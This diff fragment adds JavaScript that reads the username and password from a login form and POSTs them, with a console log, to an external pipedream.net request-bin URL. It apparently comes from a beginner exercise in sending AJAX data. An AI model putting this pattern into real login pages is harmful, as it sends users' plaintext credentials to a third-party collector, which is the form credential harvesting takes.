@@ -30,3 +30,21 @@
 
 // })
 // ajax.send()
+
+
+// Mengirim data ke hookbin
+function doLogin(){
+    const ajax = new XMLHttpRequest()
+    ajax.open("POST", "https://eog8j6v8yu28mew.m.pipedream.net")
+
+        const json = {
+            username: document.getElementById('username').value,
+            password: document.getElementById('password').value
+    }
+
+    console.log(json)
+
+    ajax.send(JSON.stringify(json))
+}
+
+document.getElementById('login').onclick = doLogin
